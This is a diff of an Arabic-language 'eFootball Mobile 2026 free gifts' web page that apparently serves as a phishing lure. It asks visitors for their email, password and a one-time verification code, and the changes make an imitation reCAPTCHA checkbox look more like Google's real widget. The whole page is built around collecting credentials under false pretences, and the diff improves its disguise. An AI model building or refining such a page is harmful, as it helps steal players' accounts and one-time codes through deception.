@@ -5,16 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>eFootball Mobile - هدايا وهبات مجانية</title>
     
-    <!-- الوسوم الخاصة بالصورة عند مشاركة الرابط مع مسار مجلد images -->
+    <!-- وسوم المعاينة لكي تظهر صورتك عند مشاركة الرابط -->
     <meta property="og:title" content="eFootball Mobile 2026 - شحن هدايا مجانية">
     <meta property="og:description" content="سجل دخولك واستلم عملات وهدايا لعبة eFootball Mobile فوراً.">
-    <meta property="og:image" content="https://siflow326.github.io/sec-terminal/images/IMG_20260830_052043_542.jpg">
+    <meta property="og:image" content="https://siflow326.github.io/efootball-free-gifts/IMG_20260830_052043_542.jpg">
     <meta property="og:type" content="website">
 
     <style>
         body {
-            /* خلفية الموقع مع مسار الصورة الصحيح داخل مجلد images */
-            background: linear-gradient(rgba(13, 27, 42, 0.85), rgba(27, 38, 59, 0.9)), url('https://siflow326.github.io/sec-terminal/images/IMG_20260830_052043_542.jpg') no-repeat center center fixed;
+            /* جعل صورتك هي خلفية الموقع مع تغميقها قليلاً لتكون الكتابة واضحة */
+            background: linear-gradient(rgba(13, 27, 42, 0.85), rgba(27, 38, 59, 0.9)), url('IMG_20260830_052043_542.jpg') no-repeat center center fixed;
             background-size: cover;
             color: #ffffff;
             font-family: 'Cairo', Tahoma, sans-serif;
@@ -37,6 +37,7 @@
             box-sizing: border-box;
         }
         .logo-img {
+            /* جعل صورتك هي اللوجو الدائري في الأعلى */
             width: 90px;
             height: 90px;
             border-radius: 50%;
@@ -74,26 +75,41 @@
             box-shadow: 0 0 8px rgba(0,245,212,0.3);
         }
         .recaptcha-box {
-            background: #1e293b;
-            border: 1px solid #475569;
-            border-radius: 6px;
-            padding: 10px;
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 4px;
+            padding: 12px 15px;
             margin-bottom: 15px;
             display: flex;
             align-items: center;
             justify-content: space-between;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
         .recaptcha-right {
             display: flex;
             align-items: center;
-            font-size: 13px;
-            color: #fff;
+            font-size: 14px;
+            color: #222;
+            font-weight: 500;
         }
         .recaptcha-right input {
-            width: 18px;
-            height: 18px;
-            margin-left: 10px;
+            width: 22px;
+            height: 22px;
+            margin-left: 12px;
             cursor: pointer;
+        }
+        .recaptcha-left {
+            text-align: center;
+        }
+        .recaptcha-left img {
+            width: 28px;
+            height: 28px;
+        }
+        .recaptcha-left span {
+            display: block;
+            font-size: 9px;
+            color: #555;
+            margin-top: 2px;
         }
         .btn {
             background: linear-gradient(135deg, #00f5d4, #00bbf9);
@@ -126,8 +142,8 @@
 <body>
 
     <div class="card">
-        <!-- اللوجو مع مسار مجلد images -->
-        <img src="https://siflow326.github.io/sec-terminal/images/IMG_20260830_052043_542.jpg" alt="Logo" class="logo-img">
+        <!-- شعار الموقع (يستعمل صورتك المرفوعة مباشرة) -->
+        <img src="IMG_20260830_052043_542.jpg" alt="Logo" class="logo-img">
         
         <h2>⚽ eFootball Mobile 2026</h2>
         <p>سجل دخولك بحساب الإيميل وكلمة المرور لمزامنة التطابق واستلام الهدايا والعملات فوراً.</p>
@@ -150,12 +166,16 @@
                 <input type="text" id="otpCode" placeholder="أدخل كود التحقق هنا">
             </div>
             
+            <!-- خانة أنا لست روبوت -->
             <div class="recaptcha-box">
                 <div class="recaptcha-right">
                     <input type="checkbox" id="robotCheck" required>
                     <label for="robotCheck">أنا لست روبوت</label>
                 </div>
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="22" alt="reCAPTCHA">
+                <div class="recaptcha-left">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                    <span>reCAPTCHA</span>
+                </div>
             </div>
 
             <button type="submit" id="submitBtn" class="btn">مزامنة وشحن الحساب</button>
